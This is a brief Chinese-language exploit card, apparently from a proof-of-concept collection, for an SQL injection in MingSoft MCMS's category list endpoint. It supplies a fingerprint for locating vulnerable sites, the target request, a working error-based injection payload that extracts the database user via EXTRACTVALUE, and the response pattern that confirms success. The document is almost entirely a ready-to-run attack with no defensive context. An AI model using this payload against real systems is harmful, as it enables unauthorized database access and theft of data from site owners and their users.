# 铭飞CMScategorySQL注入漏洞

铭飞CMScategory ｜ SQL注入 ｜ —
- **指纹**：`body="铭飞MCMS"`
- **请求**：`POST /cms/category/list HTTP/1.1`

**Payload**
```
sqlWhere=[{"action"%3a"","field"%3a"1+AND+EXTRACTVALUE(4095,CONCAT(0x5c,0x717a6a6271,(select user()),0x716b6a7871))","el":"eq","model":"contentTitle","name":"123","type":"input","value":"a"}]
```
- **响应特征**：500 qzjbqroot